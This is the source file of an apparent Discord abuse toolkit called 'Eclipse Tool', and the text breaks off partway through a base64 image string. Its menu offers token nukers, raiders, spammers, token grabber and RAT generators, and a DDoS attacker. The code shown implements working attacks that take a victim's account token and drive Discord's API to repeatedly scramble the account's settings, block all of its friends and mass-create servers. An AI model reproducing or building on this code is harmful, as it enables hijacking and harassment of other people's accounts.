from utilities.Settings.common import *
from utilities.Settings.common2 import *
from utilities.Settings.libarys import *

import utilities.Plugins.massreport
import utilities.Plugins.QR_grabber

import colorama
from selenium import webdriver
from discord.ext import commands
import discord
import random
import json
import requests
import websocket
import string
import pyautogui
import ctypes
import os
import time
from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from os import system, name
from ctypes import windll
import subprocess
import discum
import sys
import webbrowser
import base64
from colorama import Fore, Back, Style
import fade
import socket
from zipfile import ZipFile
from bs4 import BeautifulSoup
import multiprocessing
import keyboard

BANNER = '''
                    ▓█████ ▄████▄  ██▓    ██▓██▓███   ██████▓█████    ▄▄▄█████▓▒█████  ▒█████  ██▓    
                    ▓█   ▀▒██▀ ▀█ ▓██▒   ▓██▓██░  ██▒██    ▒▓█   ▀    ▓  ██▒ ▓▒██▒  ██▒██▒  ██▓██▒    
                    ▒███  ▒▓█    ▄▒██░   ▒██▓██░ ██▓░ ▓██▄  ▒███      ▒ ▓██░ ▒▒██░  ██▒██░  ██▒██░    
                    ▒▓█  ▄▒▓▓▄ ▄██▒██░   ░██▒██▄█▓▒ ▒ ▒   ██▒▓█  ▄    ░ ▓██▓ ░▒██   ██▒██   ██▒██░    
                    ░▒████▒ ▓███▀ ░██████░██▒██▒ ░  ▒██████▒░▒████▒     ▒██▒ ░░ ████▓▒░ ████▓▒░██████▒
                    ░░ ▒░ ░ ░▒ ▒  ░ ▒░▓  ░▓ ▒▓▒░ ░  ▒ ▒▓▒ ▒ ░░ ▒░ ░     ▒ ░░  ░ ▒░▒░▒░░ ▒░▒░▒░░ ▒░▓  ░
                     ░ ░  ░ ░  ▒  ░ ░ ▒  ░▒ ░▒ ░    ░ ░▒  ░ ░░ ░  ░       ░     ░ ▒ ▒░  ░ ▒ ▒░░ ░ ▒  ░
                       ░  ░         ░ ░   ▒ ░░      ░  ░  ░    ░        ░     ░ ░ ░ ▒ ░ ░ ░ ▒   ░ ░   
                       ░  ░ ░         ░  ░░               ░    ░  ░               ░ ░     ░ ░     ░  ░
                          ░                                                                        
'''

COLOR1 = Fore.RED
COLOR2 = Fore.YELLOW
COLOR3 = Fore.LIGHTRED_EX

cancel_key = "ctrl+x"

user_name_file_path = os.path.join("utilities", "Settings", "user_name.txt")

try:
    with open(user_name_file_path, "r") as file:
        user_name = file.read().strip()
        if not user_name:
            raise ValueError("File is empty")
except (FileNotFoundError, ValueError):
    ctypes.windll.kernel32.SetConsoleTitleW("Welcome to Eclipse Tool | Made by ShredGman")
    user_name = input(f"""
{Fore.RED}
   █    ██   ██████  ▓█████ ██▀███       ███▄    █  ▄▄▄      ███▄ ▄███▓ ▓█████
   ██  ▓██▒▒██    ▒  ▓█   ▀▓██ ▒ ██▒     ██ ▀█   █ ▒████▄   ▓██▒▀█▀ ██▒ ▓█   ▀
  ▓██  ▒██░░ ▓██▄    ▒███  ▓██ ░▄█ ▒    ▓██  ▀█ ██▒▒██  ▀█▄ ▓██    ▓██░ ▒███  
  ▓▓█  ░██░  ▒   ██▒ ▒▓█  ▄▒██▀▀█▄      ▓██▒  ▐▌██▒░██▄▄▄▄██▒██    ▒██  ▒▓█  ▄
  ▒▒█████▓ ▒██████▒▒▒░▒████░██▓ ▒██▒    ▒██░   ▓██░▒▓█   ▓██▒██▒   ░██▒▒░▒████
  ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░░░░ ▒░ ░ ▒▓ ░▒▓░    ░ ▒░   ▒ ▒ ░▒▒   ▓▒█░ ▒░   ░  ░░░░ ▒░ 
  ░░▒░ ░ ░ ░ ░▒  ░ ░░ ░ ░    ░▒ ░ ▒     ░ ░░   ░ ▒░░ ░   ▒▒ ░  ░      ░░ ░ ░  
   ░░░ ░ ░ ░  ░  ░      ░    ░░   ░        ░   ░ ░   ░   ▒  ░      ░       ░  
     ░           ░  ░   ░     ░                  ░       ░         ░   ░   ░  

{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Enter your username: """)
    os.makedirs(os.path.dirname(user_name_file_path), exist_ok=True)
    with open(user_name_file_path, "w") as file:
        file.write(user_name)

def cls():
  os.system('cls' if os.name=='nt' else 'clear')

def tool():
  os.system('cls' if os.name=='nt' else 'clear')
  global nolist
  global yeslist

  nolist = ["no", "n", "nope", "nah", "ne","nay","never"]
  yeslist = ["yes", "y", "yer", "yeah","yessir","ye","okay","yep","yea","ok","k","yh","sure"]

  colorama.init()

  class MyClient(discord.Client):
    pass

  global options1
  def options1():

    os.system('cls' if os.name=='nt' else 'clear')
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Made by ShredGman")
    hConsole = ctypes.windll.kernel32.GetStdHandle(-11)
    ctypes.windll.kernel32.SetConsoleScreenBufferSize(
        hConsole,
        ctypes.wintypes._COORD(125, 35)
    )
    srWindow = ctypes.wintypes.SMALL_RECT(0, 0, 125 - 1, 35 - 1)
    ctypes.windll.kernel32.SetConsoleWindowInfo(hConsole, True, ctypes.byref(srWindow))
    print(fade.fire(BANNER))
    print(f'''                                                                                        {Fore.YELLOW}Tokens: {Fore.RED}[{Fore.YELLOW}{counttokens}{Fore.RED}]''')
    print(f'                     {Fore.YELLOW}❯ {Fore.RED}[{Fore.YELLOW}TM{Fore.RED}] {Fore.YELLOW}Made by ShredGman{Fore.LIGHTRED_EX}                                   {Fore.YELLOW}Settings & Help {Fore.RED}[{Fore.YELLOW}!{Fore.RED}] {Fore.YELLOW}❮')
    print(f'                     {Fore.YELLOW}❯ {Fore.RED}[{Fore.YELLOW}00{Fore.RED}] {Fore.YELLOW}Exit{Fore.LIGHTRED_EX}                                                       {Fore.YELLOW}UPDATE {Fore.RED}[{Fore.YELLOW}UPD{Fore.RED}] {Fore.YELLOW}❮')
    print(COLOR1 + '                 ')
    print(COLOR1 + f'                 ╔══════════════════════════════╦══════════════════════════╦══════════════════════════════╗')
    print(COLOR1 + '                 ║                              ║                          ║                              ║')
    print(COLOR1 + f'                 ║    {COLOR2}ᴹ{COLOR1}[{COLOR2}01{COLOR1}] {COLOR2}TOKEN NUKERS        {COLOR1}║     {COLOR1}[{COLOR2}10{COLOR1}] {COLOR2}TOKEN GEN       {COLOR1}║     {COLOR1}[{COLOR2}19{COLOR1}] {COLOR2}TOKEN BRUTE-FORCER  {COLOR1}║')
    print(COLOR1 + f'                 ║    {COLOR2}ᴹ{COLOR1}[{COLOR2}02{COLOR1}] {COLOR2}WEBHOOK RAIDER      {COLOR1}║     {COLOR1}[{COLOR2}11{COLOR1}] {COLOR2}NITRO GEN       {COLOR1}║     {COLOR1}[{COLOR2}20{COLOR1}] {COLOR2}TOKEN CHECKER       {COLOR1}║')
    print(COLOR1 + f'                 ║     [{COLOR2}03{COLOR1}] {COLOR2}TOKEN LEAVER        {COLOR1}║     {COLOR1}[{COLOR2}12{COLOR1}] {COLOR2}PROXY GEN       {COLOR1}║     {COLOR1}[{COLOR2}21{COLOR1}] {COLOR2}TOKEN LOGIN         {COLOR1}║')
    print(COLOR1 + f'                 ║     [{COLOR2}04{COLOR1}] {COLOR2}TOKEN ONLINER       {COLOR1}║     {COLOR1}[{COLOR2}13{COLOR1}] {COLOR2}GRABBER GEN     {COLOR1}║     {COLOR1}[{COLOR2}22{COLOR1}] {COLOR2}TOKEN INFO          {COLOR1}║')
    print(COLOR1 + f'                 ║     [{COLOR2}05{COLOR1}] {COLOR2}TOKEN JOINER        {COLOR1}║     {COLOR1}[{COLOR2}14{COLOR1}] {COLOR2}QR GRABBER GEN  {COLOR1}║     {COLOR1}[{COLOR2}23{COLOR1}] {COLOR2}PFP CHANGER         {COLOR1}║')
    print(COLOR1 + f'                 ║     [{COLOR2}06{COLOR1}] {COLOR2}SERVER NUKER       {COLOR1} ║     {COLOR1}[{COLOR2}15{COLOR1}] {COLOR2}RAT BOT GEN     {COLOR1}║     {COLOR1}[{COLOR2}24{COLOR1}] {COLOR2}HYPEQUAD CHANGER   {COLOR1} ║')
    print(COLOR1 + f'                 ║     [{COLOR2}07{COLOR1}] {COLOR2}SERVER SPAMMER      {COLOR1}║     {COLOR1}[{COLOR2}16{COLOR1}] {COLOR2}ID GEN          {COLOR1}║     {COLOR1}[{COLOR2}25{COLOR1}] {COLOR2}BIO CHANGER         {COLOR1}║')
    print(COLOR1 + f'                 ║     [{COLOR2}08{COLOR1}] {COLOR2}FRIEND SPAMMER      {COLOR1}║     {COLOR1}[{COLOR2}17{COLOR1}] {COLOR2}NAME GEN        {COLOR1}║     {COLOR1}[{COLOR2}26{COLOR1}] {COLOR2}ID TO TOKEN     {COLOR1}    ║')
    print(COLOR1 + f'                 ║     [{COLOR2}09{COLOR1}] {COLOR2}GROUPCHAT SPAMMER   {COLOR1}║     {COLOR1}[{COLOR2}18{COLOR1}] {COLOR2}DDOS ATTACKER   {COLOR1}║     {COLOR1}[{COLOR2}27{COLOR1}] {COLOR2}MASE REPORT     {COLOR1}    ║')
    print(COLOR1 + '                 ║                              ║                          ║                              ║')
    print(COLOR1 + '                 ╚══════════════════════════════╩══════════════════════════╩══════════════════════════════╝')
    print(COLOR1 + f'                                                                                          {COLOR1}[{COLOR2}>{COLOR1}] {COLOR2}NEXT PAGE')
    print(COLOR1 + '')
    print(f'  {COLOR3}┌──<{user_name}{COLOR1}@{COLOR3}Eclipse>─{COLOR1}[{COLOR3}+{COLOR1}]')
    global options
    options = input(f'  {COLOR3}└───{COLOR1}➤{COLOR3} ')


  options1()

  privatechannelIds = []
  global cls
  def cls():
    os.system('cls' if os.name=='nt' else 'clear')

  global quit
  def quit():
    exit()

  def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text

  global useragent
  def useragent():
     file_path = 'data/useragents.txt'
     
     try:
         with open(file_path, 'r') as file:
             useragents = file.readlines() 
             if useragents:
                 useragents = [agent.strip() for agent in useragents]
                 return random.choice(useragents)
             else:
                 return ''
     except FileNotFoundError:
         print("")
         return ''
     except Exception as e:
         print(f"An error occurred while reading the user-agents file: {e}")
         return ''
 
     print(useragent())

  def tokennuker():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Token Nuker")
    options4 = input(f"""
{Fore.RED}
████████▓ ▒█████   ██ ▄█▀ ▓█████ ███▄    █      ███▄    █  █    ██  ██ ▄█▀ ▓█████ ██▀███  
▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒  ▓█   ▀ ██ ▀█   █      ██ ▀█   █  ██  ▓██▒ ██▄█▒  ▓█   ▀▓██ ▒ ██▒
▒ ▓██░ ▒░▒██░  ██▒▓███▄░  ▒███  ▓██  ▀█ ██▒    ▓██  ▀█ ██▒▓██  ▒██░▓███▄░  ▒███  ▓██ ░▄█ ▒
░ ▓██▓ ░ ▒██   ██░▓██ █▄  ▒▓█  ▄▓██▒  ▐▌██▒    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄  ▒▓█  ▄▒██▀▀█▄  
  ▒██▒ ░ ░ ████▓▒░▒██▒ █▄▒░▒████▒██░   ▓██░    ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄▒░▒████░██▓ ▒██▒
  ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░░ ▒░ ░ ▒░   ▒ ▒     ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░░ ▒░ ░ ▒▓ ░▒▓░
    ░      ░ ▒ ▒░ ░ ░▒ ▒░░ ░ ░  ░ ░░   ░ ▒░    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░░ ░ ░    ░▒ ░ ▒ 
  ░      ░ ░ ░ ▒  ░ ░░ ░     ░     ░   ░ ░        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░     ░    ░░   ░ 
             ░ ░  ░  ░   ░   ░           ░              ░    ░     ░  ░   ░   ░     ░     


   {Fore.RED}[{Fore.YELLOW}01{Fore.RED}] {Fore.YELLOW}FLASHBANG
   {Fore.RED}[{Fore.YELLOW}02{Fore.RED}] {Fore.YELLOW}MASS CREATE SERVERS + CHANNELS
   {Fore.RED}[{Fore.YELLOW}03{Fore.RED}] {Fore.YELLOW}MASS BLOCK
   {Fore.RED}[{Fore.YELLOW}04{Fore.RED}] {Fore.YELLOW}DELETE ALL PERSONAL SERVERS 
   {Fore.RED}[{Fore.YELLOW}05{Fore.RED}] {Fore.YELLOW}LEAVE ALL SERVERS
   {Fore.RED}[{Fore.YELLOW}06{Fore.RED}] {Fore.RESET}{Fore.RED}ULTIMATE ATTACK{Fore.RESET}
   {Fore.RED}[{Fore.YELLOW}00{Fore.RED}] EXIT

   {Fore.RED}[{Fore.YELLOW}>{Fore.RED}]{Fore.YELLOW}""")
    if options4 in ['1','01']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Flashbang Inbound")
      url = 'https://discord.com/api/v9/users/@me/settings'

      print(f'''
{Fore.RED}
  ▒████▒  ██▓    ▄▄▄       ██████   ██░ ██  ▄▄▄▄    ▄▄▄      ███▄    █  ▄████ 
▒▓██     ▓██▒   ▒████▄   ▒██    ▒ ▒▓██░ ██ ▓█████▄ ▒████▄    ██ ▀█   █  ██▒ ▀█
░▒████   ▒██░   ▒██  ▀█▄ ░ ▓██▄   ░▒██▀▀██ ▒██▒ ▄██▒██  ▀█▄ ▓██  ▀█ ██▒▒██░▄▄▄
░░▓█▒    ▒██░   ░██▄▄▄▄██  ▒   ██▒ ░▓█ ░██ ▒██░█▀  ░██▄▄▄▄██▓██▒  ▐▌██▒░▓█  ██
 ░▒█░   ▒░██████▒▓█   ▓██▒██████▒▒ ░▓█▒░██▓░▓█  ▀█▓▒▓█   ▓██▒██░   ▓██░▒▓███▀▒
  ▒ ░   ░░ ▒░▓  ░▒▒   ▓▒█▒ ▒▓▒ ▒ ░  ▒ ░░▒░▒░▒▓███▀▒░▒▒   ▓▒█░ ▒░   ▒ ▒ ░▒   ▒ 
  ░     ░░ ░ ▒  ░ ░   ▒▒ ░ ░▒  ░ ░  ▒ ░▒░ ░▒░▒   ░ ░ ░   ▒▒ ░ ░░   ░ ▒░ ░   ░ 
  ░ ░      ░ ░    ░   ▒  ░  ░  ░    ░  ░░ ░ ░    ░   ░   ▒     ░   ░ ░  ░   ░ 
        ░    ░        ░        ░    ░  ░  ░ ░            ░           ░      ░ 

      ''')
      tukan = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the token you want to mess up?: ''')
      times = int(input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}How many times do you want to blind the user of the token?: '''))

      header = {
          "authority": "discord.com",
          "path": f"/api/v9/users/@me/settings",
          'method': 'PATCH',
          "scheme": "https",
          "accept": "*/*",
          "accept-encoding": "gzip, deflate, br",
          "accept-language": "en-US",
          "Authorization": f"{tukan}",
          "content-length": "0",
          "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
          "origin": "https://discord.com",
          'referer': 'https://discord.com/channels/@me',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "user-agent": useragent(),
          "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
          "x-debug-options": "bugReporterEnabled",
          "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
      }

      changset = True
      payload = {"theme": "light", "developer_mode": changset, "afk_timeout": 60, "locale": "ko",
                  "message_display_compact": changset, "explicit_content_filter": 2,
                  "default_guilds_restricted": changset,
                  "friend_source_flags": {"all": changset, "mutual_friends": changset,
                                          "mutual_guilds": changset},
                  "inline_embed_media": changset, "inline_attachment_media": changset,
                  "gif_auto_play": changset, "render_embeds": changset,
                  "render_reactions": changset, "animate_emoji": changset,
                  "convert_emoticons": changset, "animate_stickers": 1,
                  "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                  "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                  "stream_notifications_enabled": changset, "status": "idle",
                  "detect_platform_accounts": changset, "disable_games_tab": changset}

      changset = False
      payload2 = {"theme": "dark", "developer_mode": changset, "afk_timeout": 120, "locale": "bg",
                  "message_display_compact": changset, "explicit_content_filter": 0,
                  "default_guilds_restricted": changset,
                  "friend_source_flags": {"all": changset, "mutual_friends": changset,
                                          "mutual_guilds": changset},
                  "inline_embed_media": changset, "inline_attachment_media": changset,
                  "gif_auto_play": changset, "render_embeds": changset,
                  "render_reactions": changset, "animate_emoji": changset,
                  "convert_emoticons": changset, "animate_stickers": 2,
                  "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                  "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                  "stream_notifications_enabled": changset, "status": "dnd",
                  "detect_platform_accounts": changset, "disable_games_tab": changset}


      for x in range(times):
          r = requests.patch(url,headers=header, json=payload)
          if r.status_code == 200:
              print("FLASHBANGED!")
          else:
              print(r)
          t = requests.patch(url,headers=header, json=payload2)
          if t.status_code == 200:
              print('FLASHBANGED!')
          else:
              print(t)

    elif options4 in ['3','03']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Mass Blocker")
      print(f'''
{Fore.RED}
  ███▄ ▄███▓ ▄▄▄       ██████   ██████       ▄▄▄▄    ██▓    ▒█████   ▄████▄  ▀██ ▄█▀
 ▓██▒▀█▀ ██▒▒████▄   ▒██    ▒ ▒██    ▒      ▓█████▄ ▓██▒   ▒██▒  ██▒▒██▀ ▀█   ██▄█▒ 
 ▓██    ▓██░▒██  ▀█▄ ░ ▓██▄   ░ ▓██▄        ▒██▒ ▄██▒██░   ▒██░  ██▒▒▓█    ▄ ▓███▄░ 
 ▒██    ▒██ ░██▄▄▄▄██  ▒   ██▒  ▒   ██▒     ▒██░█▀  ▒██░   ▒██   ██░▒▓▓▄ ▄██ ▓██ █▄ 
▒▒██▒   ░██▒ ▓█   ▓██▒██████▒▒▒██████▒▒    ▒░▓█  ▀█▓░██████░ ████▓▒░▒ ▓███▀  ▒██▒ █▄
░░ ▒░   ░  ░ ▒▒   ▓▒█▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░    ░░▒▓███▀▒░ ▒░▓  ░ ▒░▒░▒░ ░ ░▒ ▒   ▒ ▒▒ ▓▒
░░  ░      ░  ░   ▒▒ ░ ░▒  ░  ░ ░▒  ░      ░▒░▒   ░ ░ ░ ▒    ░ ▒ ▒░   ░  ▒   ░ ░▒ ▒░
 ░      ░     ░   ▒  ░  ░  ░  ░  ░  ░        ░    ░   ░ ░  ░ ░ ░ ▒  ░        ░ ░░ ░ 
░       ░         ░        ░        ░      ░ ░          ░      ░ ░  ░ ░      ░  ░   

      ''')

      tukan = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the token you want to block all friends with?: ''')

      url = 'https://discord.com/api/v9/users/@me/relationships'

      header = {
          "authority": "discord.com",
          "path": f"/api/v9/users/@me/relationships",
          "scheme": "https",
          "accept": "*/*",
          "accept-encoding": "gzip, deflate, br",
          "accept-language": "en-US",
          "Authorization": f"{tukan}",
          "content-length": "0",
          "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
          "origin": "https://discord.com",
          'referer': 'https://discord.com/channels/@me',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "user-agent": useragent(),
          "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
          "x-debug-options": "bugReporterEnabled",
          "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
      }

      payload = {"type": 2}
      r = requests.get(url, headers=header).json()
      for x in r:
          e = requests.put(f'{url}/{x["id"]}', headers=header, json=payload)
          if e.status_code == 200 or 204:
              print(f"Successfully blocked {x['id']}")
          else:
            print(e)

    elif options4 in ['2','02']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Token Server & Channel Maker")

      print(Fore.RED + '''
████████▓ ▒█████   ██ ▄█▀ ▓█████ ███▄    █      ███▄    █  █    ██  ██ ▄█▀ ▓█████ ██▀███  
▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒  ▓█   ▀ ██ ▀█   █      ██ ▀█   █  ██  ▓██▒ ██▄█▒  ▓█   ▀▓██ ▒ ██▒
▒ ▓██░ ▒░▒██░  ██▒▓███▄░  ▒███  ▓██  ▀█ ██▒    ▓██  ▀█ ██▒▓██  ▒██░▓███▄░  ▒███  ▓██ ░▄█ ▒
░ ▓██▓ ░ ▒██   ██░▓██ █▄  ▒▓█  ▄▓██▒  ▐▌██▒    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄  ▒▓█  ▄▒██▀▀█▄  
  ▒██▒ ░ ░ ████▓▒░▒██▒ █▄▒░▒████▒██░   ▓██░    ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄▒░▒████░██▓ ▒██▒
  ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░░ ▒░ ░ ▒░   ▒ ▒     ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░░ ▒░ ░ ▒▓ ░▒▓░
    ░      ░ ▒ ▒░ ░ ░▒ ▒░░ ░ ░  ░ ░░   ░ ▒░    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░░ ░ ░    ░▒ ░ ▒ 
  ░      ░ ░ ░ ▒  ░ ░░ ░     ░     ░   ░ ░        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░     ░    ░░   ░ 
             ░ ░  ░  ░   ░   ░           ░              ░    ░     ░  ░   ░   ░     ░     

      ''')

      tukan1 = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Enter the token you want to make servers + channels : ''')
      url = 'https://discord.com/api/v9/guilds'

      header = {
          "authority": "discord.com",
          "method": "POST",
          "path": f"/api/v9/guilds",
          "scheme": "https",
          "accept": "*/*",
          "accept-encoding": "gzip, deflate, br",
          "accept-language": "en-US",
          "Authorization": f"{tukan1}",
          "content-length": "0",
          "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
          "origin": "https://discord.com",
          'referer': 'https://discord.com/channels/@me',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "user-agent": useragent(),
          "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
          "x-debug-options": "bugReporterEnabled",
          "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
      }

      global ids
      ids = []

      def servercreate():
          image = "data:image/jpg;base64,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